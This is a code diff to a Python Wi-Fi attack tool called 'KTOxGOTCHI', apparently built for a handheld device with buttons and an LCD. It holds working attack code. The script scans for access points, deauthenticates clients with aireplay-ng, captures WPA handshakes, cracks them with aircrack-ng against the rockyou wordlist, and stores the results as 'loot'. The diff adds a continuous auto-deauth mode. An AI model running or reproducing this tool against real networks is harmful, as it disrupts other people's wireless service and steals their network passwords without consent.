@@ -1,21 +1,21 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – KTOxGOTCHI (Enhanced)
-=====================================
+KTOx Payload – KTOxGOTCHI (Full Version)
+==========================================
 Author: wickednull
 
-- Auto-scan networks, select target via UP/DOWN
-- Deauth burst to capture handshake
-- Integrated cracking with aircrack-ng (optional)
-- Tamagotchi face + stats
-- Saves handshakes and cracked keys to loot
+- Manual target selection (UP/DOWN, OK to attack)
+- Auto-deauth toggle (KEY1) for continuous attack
+- Handshake capture and optional cracking
+- Saves handshakes and cracked passwords to loot
+- Proper cleanup on exit (disables monitor mode, kills processes)
 
 Controls:
-  UP/DOWN   – select AP
-  OK        – start attack on selected AP
-  KEY1      – toggle auto-deauth (continuous burst)
+  UP/DOWN   – select AP in target list
+  OK        – attack selected target
+  KEY1      – toggle auto-deauth mode (continuous)
   KEY2      – show handshake log / cracked passwords
-  KEY3      – exit
+  KEY3      – exit (cleanup monitor mode)
 """
 
 import os
@@ -25,6 +25,7 @@ import threading
 import subprocess
 import random
 import re
+import signal
 from datetime import datetime
 
 # ----------------------------------------------------------------------
@@ -72,11 +73,12 @@ mood = "normal"
 console_msg = "Starting..."
 running = True
 interface = None
-networks = []               # list of dicts: bssid, essid, channel
+networks = []
 selected_idx = 0
 auto_deauth = False
 attack_thread = None
 attack_stop = threading.Event()
+scan_stop = threading.Event()
 
 # Loot directories
 LOOT_DIR = "/root/KTOx/loot/Handshakes"
@@ -84,7 +86,6 @@ CRACKED_DIR = "/root/KTOx/loot/CrackedWPA"
 os.makedirs(LOOT_DIR, exist_ok=True)
 os.makedirs(CRACKED_DIR, exist_ok=True)
 
-# Wordlist (default rockyou)
 WORDLIST = "/usr/share/wordlists/rockyou.txt"
 if not os.path.exists(WORDLIST):
     WORDLIST = "/usr/share/john/password.lst"
@@ -138,6 +139,9 @@ def enable_monitor_mode():
     return True
 
 def disable_monitor_mode():
+    # Kill any lingering airodump/aireplay processes
+    run_cmd("pkill -f airodump-ng")
+    run_cmd("pkill -f aireplay-ng")
     run_cmd("airmon-ng stop wlan0mon 2>/dev/null")
     run_cmd("airmon-ng stop wlan1mon 2>/dev/null")
     run_cmd("ip link set wlan0 down 2>/dev/null")
@@ -234,7 +238,6 @@ def capture_handshake(bssid, essid, channel, client_mac):
     time.sleep(2)
     set_mood("attacking")
     console_msg = f"Deauth {client_mac[-6:]}"
-    # Send deauth (burst)
     run_cmd(f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {interface}")
     time.sleep(3)
     proc.terminate()
@@ -252,7 +255,7 @@ def capture_handshake(bssid, essid, channel, client_mac):
             handshake_count += 1
             set_mood("happy")
             console_msg = f"HS! Total: {handshake_count}"
-            # Optional: auto-crack with aircrack-ng
+            # Auto-crack if wordlist exists
             if os.path.exists(WORDLIST):
                 crack_result = run_cmd(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null")
                 key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
@@ -270,7 +273,6 @@ def capture_handshake(bssid, essid, channel, client_mac):
     return False
 
 def attack_target(bssid, essid, channel):
-    global auto_deauth, console_msg
     console_msg = f"Attacking {essid[:12]}"
     set_mood("assoc")
     clients = get_clients_for_ap(bssid, channel, timeout=6)
@@ -282,16 +284,13 @@ def attack_target(bssid, essid, channel):
     return capture_handshake(bssid, essid, channel, client)
 
 def attack_loop(bssid, essid, channel):
-    """Continuous attack loop if auto_deauth is True."""
-    global auto_deauth
     while auto_deauth and not attack_stop.is_set():
         success = attack_target(bssid, essid, channel)
         if success:
-            # After successful capture, wait a bit before next attempt
             time.sleep(10)
         else:
             time.sleep(5)
-        # Refresh AP list in background (optional)
+        # Refresh AP list (optional)
         scan_networks(5)
 
 # ----------------------------------------------------------------------
@@ -321,7 +320,6 @@ def draw_screen():
     LCD.LCD_ShowImage(img, 0, 0)
 
 def draw_target_list():
-    global networks, selected_idx
     if not networks:
         draw_screen()
         return
@@ -351,12 +349,11 @@ def show_log():
     lines = ["=== HANDSHAKE LOG ==="]
     if os.path.exists(log_file):
         with open(log_file, "r") as f:
-            log_lines = f.readlines()[-5:]  # last 5
+            log_lines = f.readlines()[-5:]
             for line in log_lines:
                 lines.append(line.strip()[:20])
     else:
         lines.append("No handshakes yet")
-    # Also show cracked passwords
     cracked_files = [f for f in os.listdir(CRACKED_DIR) if f.endswith(".txt")]
     if cracked_files:
         lines.append("--- Cracked ---")
@@ -377,7 +374,6 @@ def show_log():
     d.rectangle((0, H-12, W, H), fill="#220000")
     d.text((4, H-10), "Any key to exit", font=f9, fill="#FF7777")
     LCD.LCD_ShowImage(img, 0, 0)
-    # Wait for any button
     while True:
         if wait_btn(0.1) is not None:
             break
@@ -397,7 +393,7 @@ def wait_btn(timeout=0.1):
 # Main
 # ----------------------------------------------------------------------
 def main():
-    global running, interface, auto_deauth, attack_thread, selected_idx, networks, attack_stop
+    global running, auto_deauth, attack_thread, selected_idx, networks, attack_stop, console_msg
 
     if not enable_monitor_mode():
         img = Image.new("RGB", (W, H), "black")
@@ -417,8 +413,9 @@ def main():
     # Initial scan
     scan_networks(12)
 
-    state = "main"  # main, target_select, attacking
+    state = "main"
     held = {}
+    last_scan = 0
 
     while running:
         now = time.time()
@@ -438,9 +435,10 @@ def main():
                 if networks:
                     state = "target_select"
                     draw_target_list()
-            # Refresh scan every 15 seconds in main mode
-            if int(now) % 15 == 0 and int(now) != int(now-0.5):
-                scan_networks(8)
+            # Refresh scan every 15 seconds
+            if now - last_scan > 15:
+                last_scan = now
+                scan_networks(10)
         elif state == "target_select":
             draw_target_list()
             btn = wait_btn(0.5)
@@ -458,6 +456,7 @@ def main():
                 target = networks[selected_idx]
                 state = "attacking"
                 console_msg = f"Attacking {target['essid'][:12]}"
+                draw_screen()
                 attack_stop.clear()
                 if auto_deauth:
                     attack_thread = threading.Thread(target=attack_loop, args=(target['bssid'], target['essid'], target['channel']), daemon=True)
@@ -466,7 +465,7 @@ def main():
                     attack_target(target['bssid'], target['essid'], target['channel'])
                 # After attack, return to main
                 state = "main"
-                scan_networks(8)  # refresh list
+                scan_networks(10)
         time.sleep(0.05)
 
     # Cleanup
